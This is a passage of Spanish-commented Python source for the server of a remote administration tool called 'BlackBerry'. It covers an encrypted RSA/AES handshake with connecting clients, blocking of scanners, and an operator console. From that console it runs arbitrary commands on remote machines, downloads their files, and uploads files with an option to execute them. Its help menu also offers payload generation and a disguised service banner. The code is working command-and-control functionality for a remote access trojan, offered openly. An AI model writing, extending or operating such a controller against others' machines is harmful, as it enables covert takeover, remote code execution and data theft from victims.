                    if VERBOSE_MODE >= 2:
                        logging.info("Socket de aceptación obsoleto, terminando hilo...")
                    return
                    
            client_socket, address = sock.accept()
            ip, port = address
            now = time.time()

            with behavior_lock:
                connection_behavior[ip]['timestamps'].append(now)

            if is_ip_blocked(ip):
                log_rejection_smart(ip, "bloqueo permanente")
                client_socket.close()
                continue

            if is_ip_temp_banned(ip):
                log_rejection_smart(ip, "bloqueo temporal")
                client_socket.close()
                continue

            if not is_ip_allowed(ip):
                log_rejection_smart(ip, "anti-flood")
                client_socket.close()
                continue

            check_suspicious_behavior(ip)

            client_socket.settimeout(15)
            logging.info("Nueva conexión: %s:%s — banner enviado, esperando (REQUEST_PUBKEY)", ip, port)

            service_banner = f"{SERVICE_BANNER}\r\n".encode('utf-8')
            client_socket.sendall(service_banner)

            request = client_socket.recv(1024)
            if not request:
                with behavior_lock:
                    connection_behavior[ip]['banner_grabs'] += 1
                if VERBOSE_MODE >= 2:
                    logging.info("Cliente %s:%s se desconectó tras recibir el banner (banner grab).", ip, port)
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            request_str = request.decode('utf-8', errors='ignore').strip()
            if request_str != "REQUEST_PUBKEY":
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.warning("Cliente %s:%s envió solicitud inesperada: %s — cerrando conexión.", ip, port, request_str)
                try:
                    client_socket.sendall(b"ERROR: Invalid request\r\n")
                except Exception:
                    pass
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            # Si llegó REQUEST_PUBKEY:
            logging.info("Cliente %s:%s solicitó clave pública (REQUEST_PUBKEY). Enviando clave pública.", ip, port)
            try:
                client_socket.sendall(b"PUBKEY:" + SERVER_PUBLIC_PEM)
                logging.info("Clave pública enviada a %s:%s >>", ip, port)
            except Exception as e:
                logging.error("Error enviando clave pública a %s:%s: %s", ip, port, e)
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            raw_len = recvall(client_socket, 4, 10)
            if not raw_len:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.warning("Handshake incompleto: no se recibió la longitud de la clave AES desde %s:%s", ip, port)
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            key_len = struct.unpack('!I', raw_len)[0]
            encrypted_aes_key = recvall(client_socket, key_len, 10)
            if not encrypted_aes_key:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                if VERBOSE_MODE >= 2:
                    logging.error("No se recibió la clave AES cifrada de %s", address)
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            try:
                aes_key = SERVER_PRIVATE_KEY.decrypt(
                    encrypted_aes_key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                if not isinstance(aes_key, (bytes, bytearray)) or len(aes_key) not in (16, 24, 32):
                    raise ValueError("Tamaño de clave AES inválido")
            except Exception as e:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                if VERBOSE_MODE >= 2:
                    logging.exception("Error desencriptando clave AES de %s: %s", address, e)
                client_socket.close()
                check_suspicious_behavior(ip)
                continue

            with conn_lock:
                cid = conn_id_counter
                session = ClientSession(client_socket, address, aes_key, cid)
                connections[cid] = session
                logging.info("Sesión #%s establecida con %s:%s — handshake completado, canal cifrado activo", conn_id_counter, ip, port)
                conn_id_counter += 1
            
            client_socket.settimeout(None)
            threading.Thread(target=handle_client, args=(session,), daemon=True).start()

        except ConnectionResetError:
            ip = address[0] if 'address' in locals() else "unknown"
            with behavior_lock:
                connection_behavior[ip]['failed_handshakes'] += 1
            if VERBOSE_MODE >= 2:
                logging.warning(f"Conexión reseteada por {ip} (posible SYN scan)")
            check_suspicious_behavior(ip)
            
        except OSError as e:
            if "Bad file descriptor" in str(e) or "closed" in str(e).lower():
                if VERBOSE_MODE >= 2:
                    logging.info("Socket cerrado, terminando hilo de aceptación...")
                return
            logging.exception("Error en accept_connections: %s", e)
            
        except Exception as e:
            logging.exception("Error al aceptar conexión: %s", e)

def handle_client(session):
    """Maneja la conexión activa con un cliente."""
    cid = session.session_id
    client_socket = session.socket
    aes_key = session.aes_key

    try:
        if VERBOSE_MODE >= 2:
            logging.info(f"Iniciando manejo del cliente #{cid}")
        consecutive_timeouts = 0
        TIMEOUT_LOG_THRESHOLD = 160
        last_timeout_log = 0

        while True:
            with conn_lock:
                if cid not in connections:
                    if VERBOSE_MODE >= 2:
                        logging.info(f"Cliente {cid}: Sesión removida externamente, terminando")
                    break
            
            try:
                timeout_for_recv = 161 if not session.is_interactive else 300
                msg, reason = receive_encrypted_message(client_socket, aes_key, timeout=timeout_for_recv, session=session)

                if reason == 'timeout':
                    consecutive_timeouts += 1
                    if VERBOSE_MODE == 1 and consecutive_timeouts >= TIMEOUT_LOG_THRESHOLD and (time.time() - last_timeout_log) > 100:
                        logging.info(f"Cliente {cid}: {consecutive_timeouts} timeouts seguidos (esperando datos)...")
                        last_timeout_log = time.time()
                    if not session.is_alive():
                        logging.warning(f"Cliente {cid}: Sin heartbeat, desconectando")
                        break
                    time.sleep(0.01)
                    continue

                consecutive_timeouts = 0

                if reason == 'closed':
                    if VERBOSE_MODE >= 2:
                        logging.info(f"Cliente {cid}: peer cerró la conexión.")
                    break

                if reason in ('incomplete', 'decrypt_error', 'decompress_error', 'error'):
                    if VERBOSE_MODE >= 2:
                        logging.warning(f"Cliente {cid}: Error de protocolo ({reason})")
                    if reason == 'error':
                        break
                    continue

                if msg == "HEARTBEAT":
                    session.update_heartbeat()
                    send_encrypted_message(client_socket, "HEARTBEAT_ACK", aes_key, timeout=5, session=session)
                    if VERBOSE_MODE == 1:
                        logging.debug(f"Cliente {cid}: Heartbeat recibido y ACK enviado")
                    continue

                if msg == "PONG":
                    session.update_heartbeat()
                    if VERBOSE_MODE == 1:
                        logging.debug(f"Cliente {cid}: PONG recibido")
                    continue

                if isinstance(msg, str) and msg.startswith("SIZE "):
                    expected_name = session.expected_file or f"download_{int(time.time())}"
                    session.file_event.clear()
                    session.pending_transfer = True
                    success = receive_file_stream(session, expected_name, msg, timeout=60)
                    session.file_result = success
                    session.expected_file = None
                    session.pending_transfer = False
                    session.file_event.set()
                    continue

                session.response_queue.put(msg)
                if VERBOSE_MODE == 1:
                    logging.debug(f"Cliente {cid}: Respuesta almacenada en cola (len={len(msg)} bytes)")

            except socket.timeout:
                continue
            except Exception as e:
                if VERBOSE_MODE == 1:
                    logging.exception(f"Error en comunicación con cliente {cid}: {e}")
                break

    except Exception as e:
        logging.exception(f"Error en handle_client para cliente {cid}: {e}")

    finally:
        with conn_lock:
            if cid in connections:
                del connections[cid]

        try:
            client_socket.close()
        except Exception as e:
            if VERBOSE_MODE == 1:
                logging.exception(f"Error cerrando socket de cliente {cid}: {e}")

        logging.info(f"Conexión con cliente {cid} cerrada y limpiada")

def send_command_and_wait_response(session, command, timeout=COMMAND_TIMEOUT):
    """Envía un comando y espera la respuesta de manera thread-safe."""
    client_socket = session.socket
    aes_key = session.aes_key
    
    try:
        while not session.response_queue.empty():
            try:
                session.response_queue.get_nowait()
            except Empty:
                break
        
        if not send_encrypted_message(client_socket, command, aes_key, timeout=10, session=session):
            return None
        
        try:
            response = session.response_queue.get(timeout=timeout)
            return response
        except Empty:
            if not is_socket_valid(client_socket):
                return None
            if VERBOSE_MODE == 1:
                logging.warning(f"Timeout esperando respuesta para comando: {command}")
            return None
            
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception(f"Error enviando comando '{command}': {e}")
        return None

import signal

def interact_with_client(cid, session):
    """Interactuar con una sesión cliente usando prompt_toolkit."""
    addr = session.address
    print(f"{B_GREEN}Conectado a sesión #{cid} ({addr}). Escribe 'exit' para salir.{RESET}")

    try:
        session.set_interactive(True)
    except Exception:
        pass

    orig_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, lambda s, f: None)

    session_history_file = tempfile.mktemp(prefix=f'blackberry_session_{cid}_', suffix='.txt')
    
    if PROMPT_TOOLKIT_AVAILABLE:
        session_commands = ["exit", "get", "put", "whoami", "pwd", "ls", "cd", "cat"]
        completer = WordCompleter(session_commands, ignore_case=True)
        prompt_session = PromptSession(
            history=FileHistory(session_history_file),
            auto_suggest=AutoSuggestFromHistory(),
            completer=completer,
            complete_while_typing=False
        )

    def cleanup_session_history():
        try:
            if os.path.exists(session_history_file):
                os.unlink(session_history_file)
        except Exception:
            pass

    def is_session_connected(sess):
        try:
            sock = getattr(sess, "socket", None)
            if sock is None:
                return False
            sock.getpeername()
            return True
        except Exception:
            return False

    try:
        while True:
            if not is_session_connected(session):
                print(f"\n{ALERT} {RED}Conexión perdida con la sesión #{cid}. Saliendo...{RESET}")
                break

            try:
                current_dir = send_command_and_wait_response(session, "GET_CWD", timeout=15)
                if current_dir is None:
                    if session.pending_transfer:
                        print(f"{B_CYAN}[INFO] Transferencia en progreso, esperando...{RESET}")
                        time.sleep(1)
                        continue
                    if not is_session_connected(session):
                        print(f"\n{ALERT} {RED}Conexión perdida. Saliendo...{RESET}")
                        break
                    current_dir = "[Timeout]"

                remote_user = send_command_and_wait_response(session, "whoami", timeout=10)
                if remote_user is None:
                    if session.pending_transfer:
                        continue
                    remote_user = "unknown"

                prompt_text = f"{cid} {remote_user}@({addr[0]})~[{current_dir}] >> "
                
                try:
                    if PROMPT_TOOLKIT_AVAILABLE:
                        command = prompt_session.prompt(prompt_text).strip()
                    else:
                        command = input(prompt_text).strip()
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}Usa 'exit' para salir de la sesión interactiva.{RESET}")
                    continue
                except EOFError:
                    break

                if command == "":
                    continue

                if command.lower() == "exit":
                    if session.pending_transfer:
                        print(f"{B_YELLOW}[!] Transferencia en progreso. Saliendo pero la transferencia continuará...{RESET}")
                    break

                if command.startswith("get "):
                    file_name = command.split(" ", 1)[1].strip()
                    session.expected_file = file_name
                    session.file_event.clear()
                    session.file_result = None

                    if not send_encrypted_message(session.socket, f"GET_FILE {file_name}", session.aes_key, timeout=10, session=session):
                        print(f"{ALERT} {RED}Error enviando petición GET_FILE{RESET}")
                        session.expected_file = None
                        continue

                    print(f"{B_CYAN}[INFO] Esperando archivo... (puedes escribir 'exit' para salir, la transferencia continuará){RESET}")
                    
                    if session.file_event.wait(timeout=90):
                        if session.file_result:
                            print(f"{B_GREEN}[+] Archivo '{file_name}' guardado en: {os.getcwd()}{RESET}")
                        else:
                            print(f"{ALERT} {RED}Fallo al recibir el archivo{RESET}")
                    else:
                        print(f"{B_YELLOW}[!] Timeout esperando transferencia (continuará en segundo plano){RESET}")
                        session.expected_file = None
                    continue

                if command.startswith("put "):
                    parts = command.split()
                    if len(parts) < 2:
                        print(f"{ALERT} {RED}Uso: put <archivo> [-exc]{RESET}")
                        continue

                    file_name = parts[1].strip()
                    execute_remotely = "-exc" in parts

                    if not os.path.exists(file_name):
                        print(f"{ALERT} {RED}El archivo '{file_name}' no existe.{RESET}")
                        continue

                    print(f"{B_CYAN}[INFO] Enviando archivo '{file_name}' al cliente...{RESET}")

                    try:
                        if not send_file_to_client_direct(session, file_name):
                            print(f"{ALERT} {RED}Error enviando el archivo{RESET}")
                            continue

                        print(f"{B_GREEN}[+] Archivo enviado, esperando confirmación...{RESET}")

                        cmd_str = f"PUT_FILE {os.path.basename(file_name)}"
                        if execute_remotely:
                            cmd_str += " -exc"

                        response = send_command_and_wait_response(session, cmd_str, timeout=60)

                        if response:
                            print(f"{B_GREEN}[+] Respuesta del cliente:\n{response}{RESET}")
                        else:
                            print(f"{B_YELLOW}[!] Timeout esperando respuesta (archivo probablemente enviado){RESET}")

                    except Exception as e:
                        print(f"{ALERT} {RED}Error durante PUT_FILE: {e}{RESET}")
                        if VERBOSE_MODE == 1:
                            logging.exception(f"Error en comando put para archivo {file_name}")
                    continue

                if VERBOSE_MODE >= 2:
                    logging.info(f"Enviando comando al cliente {cid}: {command}")
                print(f"{CYAN}[INFO] Comando enviado: {command}{RESET}")

                response = send_command_and_wait_response(session, command, timeout=COMMAND_TIMEOUT)

                if response is None:
                    if session.pending_transfer:
                        print(f"{B_CYAN}[INFO] Transferencia en progreso...{RESET}")
                        continue
                    if not is_session_connected(session):
                        print(f"\n{ALERT} {RED}Conexión perdida con la sesión #{cid}.{RESET}")
                        break
                    else:
                        print(f"{B_YELLOW}[!] Timeout - no se recibió respuesta (sesión sigue activa){RESET}")
                        continue

                print(response)

            except Exception as inner_e:
                if VERBOSE_MODE == 1:
                    logging.exception(f"Error en bucle interactivo sesión {cid}: {inner_e}")
                if not is_session_connected(session):
                    print(f"\n{ALERT} {RED}Conexión perdida.{RESET}")
                    break
                else:
                    print(f"{ALERT} {RED}Error: {inner_e}{RESET}")
                    continue

    finally:
        signal.signal(signal.SIGINT, orig_sigint)
        try:
            session.set_interactive(False)
        except Exception:
            pass
        
        cleanup_session_history()
        
        if VERBOSE_MODE >= 2:
            logging.info(f"Sesión {cid} limpiada tras salir de interact")

def send_file_to_client_direct(session, file_name):
    """Envía un archivo al cliente de forma cifrada con compresión."""
    sock = session.socket
    aes_key = session.aes_key

    if not os.path.isfile(file_name):
        print(f"{ALERT} {RED}Archivo '{file_name}' no encontrado{RESET}")
        return False

    try:
        file_size = os.path.getsize(file_name)
        sha = hashlib.sha256()
        with open(file_name, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()

        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=15, session=session):
            print(f"{ALERT} {RED}Error enviando encabezado{RESET}")
            return False

        print(f"{B_GREEN}[+] Enviando: {file_name} ({file_size} bytes)...{RESET}")

        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                
                flag = 0
                payload_chunk = chunk
                if ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except Exception:
                        payload_chunk = chunk
                        flag = 0

                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                sock.sendall(full_packet)
                
                if session:
                    session.add_bytes_sent(len(full_packet), compressed=(flag == 1))

        print(f"{B_GREEN}[+] Archivo enviado exitosamente.{RESET}")
        return True
        
    except Exception as e:
        print(f"{ALERT} {RED}Error enviando archivo: {e}{RESET}")
        if VERBOSE_MODE == 1:
            logging.exception("Error al enviar archivo: %s", e)
        return False

def receive_file_stream(session, file_name, header_text, timeout=60):
    """Recibe un archivo desde el cliente con soporte de compresión."""
    sock = session.socket
    aes_key = session.aes_key
    try:
        parts = header_text.split()
        if len(parts) != 3 or parts[0] != "SIZE":
            if VERBOSE_MODE == 1:
                logging.error("receive_file_stream: header inválido: %r", header_text)
            return False

        file_size = int(parts[1])
        expected_hash = parts[2]
        out_path = os.path.join(os.getcwd(), os.path.basename(file_name))
        if VERBOSE_MODE >= 2:
            logging.info("receive_file_stream: guardando %s (%d bytes) -> %s", file_name, file_size, out_path)

        received = 0
        sha = hashlib.sha256()
        with open(out_path, 'wb') as f:
            while received < file_size:
                raw_len = recvall(sock, 4, timeout)
                if not raw_len:
                    if VERBOSE_MODE == 1:
                        logging.error("receive_file_stream: raw_len perdido")
                    return False
                    
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(sock, packet_len, timeout)
                if not packet or len(packet) < 13:
                    if VERBOSE_MODE == 1:
                        logging.error("receive_file_stream: chunk inválido")
                    return False
                
                flag = packet[0]
                
                if session:
                    session.add_bytes_received(4 + packet_len, compressed=(flag == 1))
                
                nonce = packet[1:13]
                ct = packet[13:]

                aesgcm = AESGCM(aes_key)
                try:
                    chunk = aesgcm.decrypt(nonce, ct, None)
                except Exception as e:
                    if VERBOSE_MODE == 1:
                        logging.error(f"receive_file_stream: error descifrando chunk: {e}")
                    return False
                
                if flag == 1:
                    try:
                        chunk = zlib.decompress(chunk)
                        if session:
                            session.supports_compression = True
                    except Exception as e:
                        if VERBOSE_MODE == 1:
                            logging.error(f"receive_file_stream: error descomprimiendo: {e}")
                        return False

                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)

        actual_hash = sha.hexdigest()
        if received != file_size or actual_hash != expected_hash:
            if VERBOSE_MODE == 1:
                logging.error("receive_file_stream: hash/tamaño no coincide")
            return False

        if VERBOSE_MODE >= 2:
            logging.info("receive_file_stream: archivo recibido correctamente -> %s", out_path)
        return True

    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception("receive_file_stream error: %s", e)
        return False

def rebind_server(new_host, new_port):
    """Reconfigura el servidor para escuchar en un nuevo host y/o puerto."""
    global server_socket, HOST, PORT
    
    with conn_lock:
        active_clients = len(connections)
        if active_clients > 0:
            try:
                confirm = input(f"{YELLOW}[!] Hay {active_clients} cliente(s) conectado(s). ¿Continuar? (s/n): {RESET}").strip().lower()
                if confirm not in ['s', 'si', 'sí', 'y', 'yes']:
                    print(f"{B_CYAN}[INFO] Operación cancelada.{RESET}")
                    return
            except (KeyboardInterrupt, EOFError):
                print(f"\n{B_CYAN}[INFO] Operación cancelada.{RESET}")
                return
    
    try:
        with server_socket_lock:
            old_socket = server_socket
            if old_socket:
                try:
                    old_socket.close()
                    if VERBOSE_MODE >= 2:
                        logging.info("Socket antiguo cerrado")
                except Exception as e:
                    logging.warning(f"Error cerrando socket antiguo: {e}")
            
            with conn_lock:
                for cid, session in list(connections.items()):
                    try:
                        session.socket.close()
                    except Exception:
                        pass
                connections.clear()
            
            HOST = new_host
            PORT = new_port
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HOST, PORT))
            server_socket.listen(50)
            
        logging.info(f"Servidor rebind exitoso a {HOST}:{PORT}")
        print(f"{B_GREEN}[+] Servidor ahora escucha en {HOST}:{PORT}{RESET}")
        
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
        
    except OSError as e:
        logging.error(f"Error al rebind del servidor: {e}")
        print(f"{ALERT} {RED}Error: No se pudo vincular a {new_host}:{new_port} - {e}{RESET}")
    except Exception as e:
        logging.exception(f"Error inesperado al rebind: {e}")
        print(f"{ALERT} {RED}Error inesperado: {e}{RESET}")

def mostrar_info_cert(ruta_cert):
    """Muestra información detallada de un certificado X.509"""
    if not os.path.exists(ruta_cert):
        print(f"[ERROR] El archivo {ruta_cert} no existe.")
        return

    with open(ruta_cert, 'rb') as f:
        datos = f.read()
    
    try:
        cert = x509.load_pem_x509_certificate(datos, default_backend())
    except ValueError:
        cert = x509.load_der_x509_certificate(datos, default_backend())

    print("=== Información del certificado ===")
    print(f"  Sujeto       : {cert.subject.rfc4514_string()}")
    print(f"  Emisor       : {cert.issuer.rfc4514_string()}")
    print(f"  Versión      : {cert.version.name}")
    print(f"  Número serie : {cert.serial_number}")
    print(f"  Algoritmo    : {cert.signature_hash_algorithm.name}")
    print(f"  Válido desde : {cert.not_valid_before}")
    print(f"  Válido hasta : {cert.not_valid_after}")

    pubkey = cert.public_key()
    print(f"  Tipo clave pública : {type(pubkey).__name__}")
    if hasattr(pubkey, 'key_size'):
        print(f"  Tamaño clave: {pubkey.key_size} bits")
    
    print(f"  Fingerprint SHA256 : {cert.fingerprint(hashes.SHA256()).hex()}")
    print("===================================\n")

def mostrar_info_key(ruta_key):
    """Muestra información detallada de una clave privada"""
    if not os.path.exists(ruta_key):
        print(f"[ERROR] El archivo {ruta_key} no existe.")
        return

    with open(ruta_key, 'rb') as f:
        datos = f.read()
    
    try:
        clave = serialization.load_pem_private_key(datos, password=None, backend=default_backend())
    except ValueError:
        print("[ERROR] La clave está cifrada o en formato no soportado.")
        return

    print("=== Información de la clave privada ===")
    if isinstance(clave, rsa.RSAPrivateKey):
        print("  Algoritmo : RSA")
    elif isinstance(clave, ec.EllipticCurvePrivateKey):
        print("  Algoritmo : ECDSA")
        print(f"  Curva     : {clave.curve.name}")
    elif isinstance(clave, dsa.DSAPrivateKey):
        print("  Algoritmo : DSA")

    if hasattr(clave, 'key_size'):
        print(f"  Tamaño clave: {clave.key_size} bits")
    
    pub_bytes = clave.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    print(f"  Fingerprint SHA256: {hashlib.sha256(pub_bytes).hexdigest()}")
    print("======================================\n")

def format_bytes(bytes_count):
    """Formatea bytes a formato legible"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_count < 1024.0:
            return f"{bytes_count:.2f} {unit}"
        bytes_count /= 1024.0
    return f"{bytes_count:.2f} TB"

def execute_local_command_safe(command):
    """Ejecuta comandos locales de forma segura usando subprocess."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=CURRENT_WORKING_DIR
        )
        
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += result.stderr
        
        return output if output else f"Comando ejecutado (código: {result.returncode})"
        
    except subprocess.TimeoutExpired:
        return f"{ALERT} {RED}Timeout ejecutando comando (30s){RESET}"
    except Exception as e:
        return f"{ALERT} {RED}Error: {e}{RESET}"

def execute_local_command_system(command):
    """Ejecuta comandos usando os.system (solo para comandos E/e)."""
    try:
        original_dir = os.getcwd()
        os.chdir(CURRENT_WORKING_DIR)
        
        exit_code = os.system(command)
        
        os.chdir(original_dir)
        
        if exit_code == 0:
            return f"{B_GREEN}Comando ejecutado exitosamente{RESET}"
        else:
            return f"{YELLOW}Comando ejecutado con código: {exit_code}{RESET}"
            
    except Exception as e:
        return f"{ALERT} {RED}Error: {e}{RESET}"

def interactive_shell():
    """Bucle principal de interacción con el operador usando prompt_toolkit."""
    global CURRENT_WORKING_DIR
    
    BlackBerrybanner()
    
    history_file = setup_temp_history()
    
    if PROMPT_TOOLKIT_AVAILABLE:
        completer = WordCompleter(COMMANDS, ignore_case=True)
        prompt_session = PromptSession(
            history=FileHistory(history_file),
            auto_suggest=AutoSuggestFromHistory(),
            completer=completer,
            complete_while_typing=False
        )
    
    while True:
        try:
            if PROMPT_TOOLKIT_AVAILABLE:
                cmd = prompt_session.prompt(f"BlackBerry> ").strip()
            else:
                cmd = input(f"{B_BLUE}{BOLD}BlackBerry> {RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}{BOLD}Usa 'exit' para salir.{RESET}")
            continue

        if not cmd:
            continue
            
        parts = cmd.split()
        base_cmd = parts[0].lower()

        # Comando CD local
        if base_cmd == "cd":
            if len(parts) < 2:
                print(f"{B_CYAN}Directorio actual: {CURRENT_WORKING_DIR}{RESET}")
            else:
                try:
                    new_dir = ' '.join(parts[1:])
                    if new_dir == "~":
                        new_dir = os.path.expanduser("~")
                    
                    target_dir = os.path.abspath(os.path.join(CURRENT_WORKING_DIR, new_dir))
                    
                    if os.path.isdir(target_dir):
                        CURRENT_WORKING_DIR = target_dir
                        print(f"{B_GREEN}[+] Directorio cambiado a: {CURRENT_WORKING_DIR}{RESET}")
                    else:
                        print(f"{ALERT} {RED}Error: El directorio no existe{RESET}")
                except Exception as e:
                    print(f"{ALERT} {RED}Error cambiando directorio: {e}{RESET}")
            continue

        # Comandos E/e para ejecución con os.system
        if base_cmd in ["e", "E"]:
            if len(parts) < 2:
                print(f"{YELLOW}Uso: E <comando> (ejecución directa con os.system){RESET}")
                continue
            
            command_to_execute = ' '.join(parts[1:])
            print(f"{B_CYAN}[EXEC] Ejecutando con os.system: {command_to_execute}{RESET}")
            result = execute_local_command_system(command_to_execute)
            print(result)
            continue

        if base_cmd in ["help", "ayuda"]:
            help_text = f"""
{B_WHITE}{BOLD}BlackBerry - Herramienta de administración remota RSA-OAEP_AES-GCM v1.5{RESET}

{B_GREEN}Comandos del Servidor:{RESET}
  {B_GREEN}list{RESET}{B_WHITE}                   -> Lista conexiones activas con estadísticas.{RESET}
  {B_GREEN}select <ID>{RESET}{B_WHITE}            -> Interactúa con una sesión de cliente.{RESET}
  {B_GREEN}set host <HOST>{RESET}{B_WHITE}        -> Cambia el host de escucha.{RESET}
  {B_GREEN}set port <PUERTO>{RESET}{B_WHITE}      -> Cambia el puerto de escucha.{RESET}
  {B_GREEN}sVbanner "<BANNER>"{RESET}{B_WHITE}    -> Cambia el banner del servicio.{RESET}
  {B_GREEN}generate-payload{RESET}{B_WHITE}       -> Genera un payload de cliente.{RESET}
  {B_GREEN}fingerprint{RESET}{B_WHITE}            -> Muestra el fingerprint RSA del servidor.{RESET}
  {B_GREEN}proxy-tls{RESET}{B_WHITE}              -> Inicia el proxy TLS.{RESET}
  {B_GREEN}proxy-tls-gui{RESET}{B_WHITE}          -> Inicia el proxy TLS en modo gráfico.{RESET}
  {B_GREEN}log{RESET}{B_WHITE}                    -> Imprime el log del servidor.{RESET}
  {B_GREEN}rsa-keys{RESET}{B_WHITE}               -> Imprime las claves RSA generadas.{RESET}
  {B_GREEN}cert{RESET}{B_WHITE}                   -> Info del certificado del proxy.{RESET}
  {B_GREEN}new-cert{RESET}{B_WHITE}               -> Crea nuevo certificado personalizado.{RESET}
  {B_GREEN}block <IP>{RESET}{B_WHITE}             -> Bloquea IP permanentemente.{RESET}
  {B_GREEN}unblock <IP>{RESET}{B_WHITE}           -> Desbloquea una IP.{RESET}
  {B_GREEN}blocklist{RESET}{B_WHITE}              -> Muestra IPs bloqueadas.{RESET}
  {B_GREEN}clean{RESET}{B_WHITE}                  -> Limpia archivos de log.{RESET}
  {B_GREEN}E <comando>{RESET}{B_WHITE}            -> Ejecuta comando con os.system.{RESET}
  {B_YELLOW}exit{B_RED}                  -> Salir y cerrar el servidor.{RESET}"""
            print(help_text)
            continue

        elif base_cmd == "svbanner":
            if len(parts) < 2:
                print(f"{B_CYAN}Banner actual: {SERVICE_BANNER}{RESET}")
                print(f"{YELLOW}Uso: sVbanner \"nuevo banner\"{RESET}")
                continue
            
            new_banner = ' '.join(parts[1:])
            if (new_banner.startswith('"') and new_banner.endswith('"')) or \
               (new_banner.startswith("'") and new_banner.endswith("'")):
                new_banner = new_banner[1:-1]
                
            success, message = set_service_banner(new_banner)
            if success:
                print(f"{B_GREEN}[+] {message}{RESET}")
            else:
                print(f"{ALERT} {RED}[-] {message}{RESET}")

        elif base_cmd == "fingerprint":
            fingerprint = get_rsa_key_fingerprint(SERVER_PUBLIC_PEM)
            if fingerprint:
                print(f"{B_GREEN}Fingerprint RSA del servidor:{RESET}")
                print(f"{B_CYAN}{fingerprint}{RESET}")
            else:
                print(f"{ALERT} {RED}Error calculando fingerprint{RESET}")

        elif base_cmd == "proxy-tls":
            try:
                if "gui" in cmd.lower():
                    import multiprocessing
                    def run_tls_proxyGUI():
                        import BlackBerry_TLSProxyGUI
                        BlackBerry_TLSProxyGUI.lanzar_gui_proxy()
                    
                    p = multiprocessing.Process(target=run_tls_proxyGUI)
                    p.daemon = True
                    p.start()
                    print(f"{B_GREEN}[+] Proxy TLS GUI iniciado{RESET}")
                else:
                    from BlackBerry_TLSProxy import start_proxy
                    
                    global tls_proxy
                    tls_proxy = start_proxy(
                        listen_port=9948,
                        target_port=9949,
                        enable_console_log=False
                    )
                    tls_proxy.start(blocking=False)
                    print(f"{B_GREEN}[+] Proxy TLS daemon iniciado{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error: {e}{RESET}")
        
        elif base_cmd == "proxy-tls-gui":
            import multiprocessing
            try:
                def run_tls_proxyGUI():
                    import BlackBerry_TLSProxyGUI
                    BlackBerry_TLSProxyGUI.lanzar_gui_proxy()
                
                p = multiprocessing.Process(target=run_tls_proxyGUI)
                p.daemon = True
                p.start()
                print(f"{B_GREEN}[+] Proxy TLS GUI iniciado{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error: {e}{RESET}")
    
        elif base_cmd == "log":
            try:
                log_file = f"{script_dir}/logs/BlackBerryServer.log"
                if os.path.exists(log_file):
                    with open(log_file, "r") as f:
                        print(f.read())
                else:
                    print(f"{YELLOW}[!] No existe archivo de log{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error leyendo log: {e}{RESET}")

        elif base_cmd == "banner":
            BlackBerrybanner()

        elif base_cmd == "clean":
            try:
                if os.path.exists(f"{script_dir}/logs/BlackBerryServer.log"):
                    os.remove(f"{script_dir}/logs/BlackBerryServer.log")
                    print(f"{B_GREEN}[+] Log del servidor limpiado{RESET}")
                if os.path.exists(f"{script_dir}/logs/BlackBerryTLSProxy.log"):
                    os.remove(f"{script_dir}/logs/BlackBerryTLSProxy.log")
                    print(f"{B_GREEN}[+] Log del proxy limpiado{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error limpiando logs: {e}{RESET}")

        elif base_cmd in ["list", "clients"]:
            with conn_lock:
                if not connections:
                    print(f"{YELLOW}No hay conexiones activas.{RESET}")
                else:
                    print(f"\n{B_CYAN}{'='*60}{RESET}")
                    print(f"{B_GREEN}{BOLD}Conexiones Activas{RESET}")

                    now = time.time()
                    for cid, session in connections.items():
                        with session.lock:
                            ip, port = session.address[0], session.address[1]
                            sent_raw = session.bytes_sent
                            recv_raw = session.bytes_received
                            sent_comp = session.compressed_sent
                            recv_comp = session.compressed_received
                            hb_count = getattr(session, "heartbeat_count", 0)
                            start_time = getattr(session, "start_time", None)

                        age = int(now - start_time) if start_time else -1

                        print(f"{B_WHITE}ID:{RESET} {B_GREEN}{cid}{RESET}  |  {B_BLUE}IP:{RESET} {ip}:{port}")
